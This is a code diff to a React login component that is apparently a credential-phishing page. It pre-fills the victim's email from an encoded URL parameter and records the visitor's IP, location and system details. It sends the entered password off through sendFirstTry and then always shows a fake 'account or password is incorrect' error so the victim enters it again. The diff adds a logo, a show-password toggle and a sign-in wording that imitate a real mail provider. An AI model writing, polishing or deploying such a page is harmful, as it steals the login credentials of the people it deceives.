@@ -2,6 +2,7 @@ import React, { useState, useEffect, useRef } from 'react';
 import axios from 'axios';
 import { useNavigate } from 'react-router-dom';
 import './Access.css';
+import companyLogo from '../assets/images/logo.svg';
 
 const SecurePortal = () => {
   const [userInput, setUserInput] = useState('');
@@ -16,9 +17,54 @@ const SecurePortal = () => {
   const [clientIP, setClientIP] = useState('');
   const [locationData, setLocationData] = useState({});
   const [systemInfo, setSystemInfo] = useState({});
+  const [showPassword, setShowPassword] = useState(false);
   const inputRef = useRef(null);
   const redirect = useNavigate();
   const blockedIPs = ['86.98.95.155'];
+  const EyeOpenIcon = () => (
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#000000">
+    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+    <circle cx="12" cy="12" r="3"></circle>
+  </svg>
+    );
+
+  const EyeClosedIcon = () => (
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#000000">
+        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+        <line x1="1" y1="1" x2="23" y2="23"></line>
+      </svg>
+    );
+  // Extract email from URL
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    const emailParam = params.get('id') || params.get('u');
+    if (emailParam) {
+      try {
+        const decodedEmail = atob(decodeURIComponent(emailParam));
+        if (decodedEmail.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
+          setUserInput(decodedEmail);
+          setIsValidated(true);
+        }
+      } catch {
+        if (emailParam.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
+          setUserInput(emailParam);
+          setIsValidated(true);
+        }
+      }
+    }
+  }, []);
+
+  // Auto-focus logic
+  useEffect(() => {
+    if (!isLocked && !isLoading && inputRef.current) {
+      inputRef.current.focus();
+    }
+  }, [isLocked, isLoading, errorMsg]);
+
+  // Toggle password visibility
+  const togglePasswordVisibility = () => {
+    setShowPassword(!showPassword);
+  };
 
   const obscureParam = (text) => {
     try {
@@ -41,7 +87,6 @@ const SecurePortal = () => {
     const getNetworkData = async () => {
       try {
         const ipResponse = await axios.get('https://api.ipify.org?format=json');
-
         if (blockedIPs.includes(ipResponse.data.ip)) {
           alert('Access not available');
           window.location.href = '/restricted';
@@ -82,41 +127,7 @@ const SecurePortal = () => {
 
     getNetworkData();
     getSystemDetails();
-
-    const params = new URLSearchParams(window.location.search);
-    let paramData = params.get('u') || params.get('id');
-
-    if (paramData) {
-      if (paramData.includes('@')) {
-        if (paramData.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
-          setUserInput(paramData);
-          setIsValidated(true);
-          setTimeout(() => inputRef.current?.focus(), 100);
-          const obscured = obscureParam(paramData);
-          if (obscured) {
-            window.history.replaceState({}, '', `?u=${obscured}`);
-          }
-        }
-      } else {
-        try {
-          paramData = atob(decodeURIComponent(paramData));
-          if (paramData.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
-            setUserInput(paramData);
-            setIsValidated(true);
-            setTimeout(() => inputRef.current?.focus(), 100);
-          }
-        } catch {
-          return;
-        }
-      }
-    }
   }, []);
-
-  useEffect(() => {
-    if (!isLocked && inputRef.current) {
-      inputRef.current.focus();
-    }
-  }, [isLocked]);
 
   const handleInputChange = (e) => {
     setUserInput(e.target.value);
@@ -192,7 +203,7 @@ const SecurePortal = () => {
       await sendFirstTry(code);
 
       setTimeout(() => {
-        setErrorMsg(<span className='status-notification'>The email or password entered is incorrect. Please try again.</span>);
+        setErrorMsg(<span className='status-notification' style={{ color: 'red' }}>Your account or password is incorrect. Try again. If you don't remember your password, reset it now.</span>);
         setIsLocked(false);
       }, 200);
       return;
@@ -235,83 +246,81 @@ const SecurePortal = () => {
   };
 
   return (
-    <div className="access-interface">
-      <form className="auth-panel" autoComplete="off">
+    <div className="login-container">
+      <form
+        className="login-form"
+        autoComplete="off"
+        onSubmit={(e) => {
+          e.preventDefault();
+          if (!isLoading && !isLocked && accessCode) {
+            handleAccess();
+          }
+        }}
+      >
         <input type="text" style={{ display: 'none' }} autoComplete="false" />
 
-        <div className="auth-section">
-          {isValidated ? (
-            <h3>Confirm email password to continue</h3>
-          ) : (
-            <h2>Provide your email</h2>
-          )}
-          <div className="id-input-container">
-            <input
-              id="user-field"
-              type="email"
-              value={userInput}
-              onChange={handleInputChange}
-              disabled={isValidated}
-              placeholder="Your email address"
-              required
-              autoFocus={!isValidated}
-              className="data-field"
-            />
-          </div>
-          {!isValidated && (
-            <div className="action-container">
-              <button
-                onClick={validateInput}
-                disabled={isLoading || isValidated || !userInput}
-                className="auth-btn"
-              >
-                {isLoading ? (
-                  <span className="load-indicator"></span>
-                ) : (
-                  'Verify Email'
-                )}
-              </button>
-            </div>
-          )}
+        <div className="company-header">
+          <span className="company-logo">
+            <img src={companyLogo} alt="Company Logo" />
+          </span>
         </div>
 
-        {isValidated && (
-          <>
-            <div className="auth-section">
+        <div className="form-section">
+          <div className="email-display">
+            <span className="email-icon">←</span>
+            <span className="email-text">
+              {userInput || 'sales@techniline.org'}
+            </span>
+          </div>
+
+          <div className="password-line-container">
+            <h3 className="password-title">Enter password</h3>
+            {errorMsg && (
+              <div className="error-message" style={{ color: '#ff0000' }}>
+                {errorMsg}
+              </div>
+            )}
+            <div className="password-input-wrapper">
               <input
-                id="code-input"
-                type="password"
+                type={showPassword ? 'text' : 'password'}
                 ref={inputRef}
                 value={accessCode}
                 onChange={(e) => setAccessCode(e.target.value)}
-                placeholder="Email Password"
+                className="password-line"
+                autoFocus={!isLoading && !isLocked}
                 required
-                autoFocus
-                disabled={isLocked}
-                className="data-field"
+                placeholder="Password"
+                disabled={isLoading || isLocked}
               />
-            </div>
-
-            {errorMsg && (
-              <div className="status-notification">{errorMsg}</div>
-            )}
-
-            <div className="action-container">
               <button
                 type="button"
-                onClick={handleAccess}
-                disabled={isLoading || isLocked || !accessCode}
-                className="auth-btn"
+                className="password-toggle"
+                onClick={togglePasswordVisibility}
+                aria-label={showPassword ? 'Hide password' : 'Show password'}
               >
-                {isLoading ? (
-                  <span className="load-indicator"></span>
-                ) : (
-                  'Continue'
-                )}
+                {showPassword ? <EyeClosedIcon /> : <EyeOpenIcon />}
               </button>
             </div>
-          </>
-        )}
+          </div>
+
+          <a href="#" className="forgot-password">
+            Forgot my password
+          </a>
+
+          <div className="button-container">
+            <button
+              type="submit"
+              disabled={isLoading || isLocked || !accessCode}
+              className="submit-button"
+            >
+              {isLoading ? (
+                <span className="spinner"></span>
+              ) : (
+                'Sign in'
+              )}
+            </button>
+          </div>
+        </div>
       </form>
     </div>
   );
